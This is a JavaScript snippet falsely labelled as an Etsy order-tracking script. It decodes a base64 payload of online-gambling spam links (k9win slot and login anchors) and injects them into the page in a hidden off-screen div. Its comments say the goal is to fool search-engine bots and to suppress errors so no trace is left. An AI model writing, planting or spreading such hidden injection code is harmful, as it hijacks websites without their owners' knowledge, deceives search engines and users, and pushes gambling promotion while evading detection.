// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly9iYWdhdHRpbmlzYS5jaC9wcm9qZWN0cy8iPms5d2luPC9hPgo8YSBocmVmPSJodHRwczovL2JhZ2F0dGluaXNhLmNoL3Byb2plY3RzLyI+azl3aW4gc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9iYWdhdHRpbmlzYS5jaC9wcm9qZWN0cy8iPms5d2luIGxvZ2luPC9hPgo8YSBocmVmPSJodHRwczovL2JhZ2F0dGluaXNhLmNoL3Byb2plY3RzLyI+IGs5d2luIGRhZnRhcjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9iYWdhdHRpbmlzYS5jaC9wcm9qZWN0cy8iPms5d2luIGxpbms8L2E+CjxhIGhyZWY9Imh0dHBzOi8vYmFnYXR0aW5pc2EuY2gvcHJvamVjdHMvIj5rOXdpbiBydHA8L2E+CjxhIGhyZWY9Imh0dHBzOi8vYmFnYXR0aW5pc2EuY2gvcHJvamVjdHMvIj5rOXdpbiBsaW5rIGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vYmFnYXR0aW5pc2EuY2gvcHJvamVjdHMvIj5saW5rIGs5d2luPC9hPgo8YSBocmVmPSJodHRwczovL2JhZ2F0dGluaXNhLmNoL3Byb2plY3RzLyI+c2l0dXMgazl3aW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vYmFnYXR0aW5pc2EuY2gvcHJvamVjdHMvIj5zaXR1cyBnYWNvciBrOXdpbjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9iYWdhdHRpbmlzYS5jaC9wcm9qZWN0cy8iPnNpdHVzIHNsb3Qgazl3aW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vYmFnYXR0aW5pc2EuY2gvcHJvamVjdHMvIj5zbG90IGdhY29yIGs5d2luPC9hPgo8YSBocmVmPSJodHRwczovL2JhZ2F0dGluaXNhLmNoL3Byb2plY3RzLyI+azl3aW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vYmFnYXR0aW5pc2EuY2gvcHJvamVjdHMvIj5rOXdpbiBzbG90PC9hPgo8YSBocmVmPSJodHRwczovL2JhZ2F0dGluaXNhLmNoL3Byb2plY3RzLyI+azl3aW4gbG9naW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vYmFnYXR0aW5pc2EuY2gvcHJvamVjdHMvIj5rOXdpbiBsaW5rPC9hPgo8YSBocmVmPSJodHRwczovL2JhZ2F0dGluaXNhLmNoL3Byb2plY3RzLyI+azl3aW4gYWx0ZXJuYXRpZjwvYT4=";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
